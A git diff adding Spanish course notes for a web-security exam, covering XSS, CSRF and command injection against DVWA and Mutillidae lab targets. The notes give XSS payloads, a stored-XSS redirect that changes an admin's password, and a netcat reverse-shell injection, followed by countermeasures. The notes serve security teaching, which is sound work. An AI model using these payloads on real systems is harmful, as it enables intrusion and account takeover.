@@ -31,9 +31,14 @@ Las fechas previstas para la realización de éstas pruebas prácticas serán lo
 # Apuntes
 
 ## Tabla de contenidos
-1. [SQLi Error Based](#sqli-error-based)
-2. [SQLi UNION Based](#sqli-union-based)
-3. [SQLi Blind Based](#sqli-blind-based)
+1.1 [SQLi Error Based](#sqli-error-based)
+<br> 1.2 [SQLi UNION Based](#sqli-union-based)
+<br> 1.3 [SQLi Blind Based](#sqli-blind-based)
+<br>
+<br> 2.1 [XSS Reflejado](#xss-reflejado)
+<br> 2.2 [XSS Persistente](#xss-persistente)
+<br> 2.3 [Cross-Site Request Forgery](#cross-site-request-forgery)
+<br> 2.4 [Inyección de comandos](#inyección-de-comandos)
 
 ## 1ª parte: (3,3 p.)
 
@@ -293,10 +298,147 @@ Podemos acelerar el proceso , sí en el comando de sqlmap, indicamos que realice
 
 ## 2ª parte: (3,3 p.)
 
+### Introducción XSS y CSRF
+
+Estos ataques son también de inyección de código. 
+
+*XSS* significa *Cross Site Scripting* y se producen cuando el servidor permite al cliente modificar código fuente de una página web, aunque algunas veces estas modificaciones pueden ser inofensivas, otras veces pueden ser muy peligrosas, tanto como para el usuario como para el propio servidor de la web.
+
+*CSRF* significa *Cross-Site Request Forgery* siendo este una variante de *XSS*
+
+#### Tipos de XSS:
+- XSS Reflejado > su explotación no tiene persistencia en el servidor
+- XSS Persistentes > si tiene persistencia en el servidor, y es potencialmente peligoroso para otros clientes Web
+- Cross-Site Request Forgery > falsificar peticiones de usuarios para forzarle a realizar acciones sin su consentimiento
+
+#### ¿Qué se puede lograr con ataques XSS y CSRF?
+
+- Acciones puntuales no deseadas para los clientes: por ejemplo participar en una votación o influir en el SEO
+- Redirecciones forzadas: enviar a los clientes de una web a otra web
+- Obtener el control de los ordenadores de los clientes: el atacante puede descargar malware en las víctimas
+- Dañar la imagen o reputación de una empresa: por ejemplo, cambiando la imagen y contenido de una web
+- Realizar tareas con un rol que no pertenece al atacante: acceder con privilegios de administrador
+
 ### XSS Reflejado
+
+- Identificamos un input cuyo valor introducido se muestre en un elemento html o sea procesado
+- Intorducir distintas prueba para verificar que es vulnerable
+    - Podemos introducir un `<h1>hola</h1>` o `<pre>hola</pre>` para verificar si procesa este html y lo interpresa
+    - Para confirmar que permite ataques XSS escribiremos el siguiente input
+        - `<script>alert(123);</script>`
+
+** Este tipo de ataques no son muy peligrosos, aunque si se está haciendo un ataque Man In The Middle si pueden resultarlo
+
+
+#### Repaso práctico
+- 1. Vamos a Firefox en la máquina Kali
+- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
+- 3. Y desde ahí accedemos a DVWA (Damn Vulnerable Web Application) > XSS Reflected
+
+
 ### XSS Persistente
+
+Este tipo de ataque XSS almacena información en el servidor, de tal manera que cuando otros clientes acceden al archivo HTML en concreto, les afectará a ellos también
+
+#### ¿Como identificar posible vulnerabilidad XSS Stored?
+
+Estos posibles ataques de XSS Stored, pueden darse en formulario de alta (comentarios por ejemplo) cuya información que introducimos será mostrada más tarde, de forma que si interpresa el código introducido, será vulnerable a XSS Stored
+
+- Formulario de alta
+- Comprobar vulnerabilidad introducciendo en un input
+    - Podemos introducir un `<h1>hola</h1>` o `<pre>hola</pre>` para verificar si procesa este html y lo interpresa
+    - Para confirmar que permite ataques XSS escribiremos el siguiente input
+        - `<script>alert(123);</script>`
+- Refrescar la vista para renderizar los datos introducidos
+
+** Los sitios vulnerables a estos ataques suelen ser BLOGS o FOROS
+
+#### Algunas inyecciones comunes son
+
+- `<script>alert(1)</script>`
+- `<img src=1 href=1 onerror="javascript:alert(1)"></img>`
+- `<iframe src="javascript:alert(1)"></iframe>`
+- `<input onfocus=javascript:alert(1) autofocus>`
+
+#### Repaso práctico
+- 1. Vamos a Firefox en la máquina Kali
+- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
+- 3. Y desde ahí accedemos a DVWA (Damn Vulnerable Web Application) > XSS Stored
+
+- https://xss-game.appspot.com
+- https://xss-quiz.int21h.jp
+
 ### Cross-Site Request Forgery
+
+La vulnerabilidad Cross-Site Request Forgery (CSRF) ocurre en aplicaciones web y le permite a un atacante inducir a los usuarios a realizar acciones que no pretenden realizar, como por ejemplo, cambiar su dirección de correo electrónico, su contraseña o realizar una transferencia de fondos.
+
+Mediante una CSRF, un atacante puede eludir parcialmente la política que evita que diferentes sitios web se interfieran entre sí (Same-Origina Policy).
+
+#### ¿Cómo funciona una vulenrabilidad CSRF?
+
+Para que un ataque CSRF sea posible, deben cumplirse tres condiciones:
+
+- *Existe una acción relevante que el atacante quiere inducir.* Puede ser una acción privilegiada (modificar permisos para otros usuarios) o una acción sobre datos específicos del usuario (cambiar la propia contraseña del usuario).
+- *El manejo de sesiones debe estar basado en cookies* dado que realizar una acción implica realizar una o más solicitudes HTTP. Y si la aplicación utiliza cookies de sesión, estas siempre serán enviadas para identificar al usuario que ha realizado las solicitudes. 
+- *Las solicitudes no contienen parámetros impredecibles*, es decir, no existen valores que el atacante tenga que determinar o adivinar. Por ejemplo, al hacer que un usuario cambie su contraseña, la función no es vulnerable si un atacante necesita conocer el valor de la contraseña existente.
+
+#### ¿Cómo llevarlo a cabo?
+
+Consiste en la inyección de código a través de un input vulnerable XSS, ya que nos permitirá realizar la insercción de código y que este se ejecute.
+
+#### *Ejemplo práctico para Examen*
+
+- 1 > Abrimos burpsuite (para interceptar la llamada) > Temporary project > Use Burp defaults > Start Burp (button)
+- 2 > Vamos a Proxy > Open browser
+- 3 > En el navegador abierto, accedemos a DVWA > CSRF
+- 4 > En bupsuite, activamos en la parte superior el botón Intercept is off -> Intercept is on (Se pondrá en escucha para interceptar)
+- 5 > Volvemos al navegador donde estabamos (CSRF) introducimos los campos de *new password* y *confirm new password*
+- 6 > Burpsuite interceptará la llamada, por tanto guardaremos la información interceptada (con la información guardada, podemos pulsar de nuevo en intercept is on para pasarlo a off)
+- 7 > Iremos a una parte vulnerable de la web que permita la inyección XSS de forma persistente (en DVWA, apartado XSS stored)
+- 8 > En el input vulnerable inyectaremos el siguiente comando modificando lo necesario:
+    - <script> document.location='http://{url_server_owasp}[ url GET (primera linea) interceptada por burpsuite (teniendo en cuenta de cambiar los valores de los params si fuera necesario) ]';</script>
+    - el Resultado será algo similar al siguiente
+    - <script> document.location-'http://192.168.1.183/dvwa/vulnerabilites/csrf/?password_new=admin&password_conf=admin&Change=Change#';</script>
+- 9 > Al quedar este código persistido, cuando se ejecute, esto nos redirigirá a la pagina de CSRF, cambiando el valor de la password, ya que no hay una validación de CSRF, por tanto cuando el admin acceda a la página donde hemos persisito el código inyectado, se cambiará su password, dandonos acceso al administrador.
+
+
+#### Contramedidas a usar contra XSS y CSRF
+
+- Las contramedidas para evitar este tipo de ataque son parecidas a las de sqli. (Ver tema)
+- El saneado de datos de entrada es clave para evitar el ataque. Suponiendo que estamos empleando PHP en el server side (lado del servidor):
+    - strip_tags: Función que permite eliminar las etiquetas PHP y HTML, es ideal para evitar la vulnerabilidad. (esta función tiene el problema de que no elimina código de los atributos de las etiquetas que permitamos)
+    - preg_replace: Permite emplear una expresión regular para buscar y sustituir la expresión dada, podemos usarla para corregir el comportamiento de strip_tags. Además es conveniente emplear expresiones regulares para asegurar que lo que envía el cliente es lo que esperamos.
+
 ### Inyección de comandos
+
+Se trata de un tipo de vulnerabilidad *MUY PELIGROSA* ya que permite al cliente ejecutar algo en el lado del servidor.
+La ejecución de comandos como la CONCATENACIÓN DE COMANDOS es una de las más básicas. Esto suele pasar cuando el cliente DECIDE un parámetro en la ejecución de un comando, y escribe otras cosas que le permiten ejecutar más cosas o comandos, que lo que se suponía que debería solamente ejecutar. Por ejemplo, usando el caracter ";" en Linux, que permite concatenar en una misma linea varios comandos que se ejecutarán secuencialmente.
+
+#### *Ejemplo práctico para Examen*
+
+- 1. Accedemos a "Multitude II" en owasp
+- 2. Dentro de este apartado iremos a OWASP 2013 -> A1 - Injection (Other) -> Command Injection -> DNS Lookup
+- 3. Dentro encontraremos un input vulnerable a inyección de comandos
+- 4. Verificamos la ejecución remota introduciendo `; ls -la` recibiremos por pantalla la salida del ls
+
+#### *reverse-shell o shell remota*
+
+Usaremos el siguiente conjunto de instrucciones 
+- En la maquina atacante [ Equipo Kali ] ejecutaremos el nc en modo espera a que se conecten remotamente
+    - `nc -vlp 9876`
+- En el input vulnerable de inyección de código ejecutaremos la siguiente instrucción
+    - `; rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | sh -i 2>&1 | nc [ ip maquina kali ] [ puerto escucha maquina kali ] > /tmp/f`
+    - Para este ejemplo quedaría tal cual así:
+    - `; rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | sh -i 2>&1 | nc 192.168.1.174 9876 > /tmp/f`
+- Si vamos a la terminal de Kali , podremos ver como se ha realizado una conexión remota y ya estamos dentro del servidor atacado
+
+
+#### Contramedidas contra inyección de comandos
+
+- Otra vez es clave el saneado de la entrada de los clientes.
+- Debemos evitar en la entrada cualquier carácter que permita concatenar comandos, así como las opciones no permitidas de los comandos permitidos.
+- Una buena idea puede ser crear un usuario que solo tenga permiso para ejecutar los comandos necesarios. De esta forma nos protegemos también en caso de que vulneren el sistema.
+- Evitar fallos de seguridad por diseño. No deberiamos permitir que ejecuten comandos que puedan ser peligrosos para el sistema, por ejemplo netcat sin control.
 
 ***
 
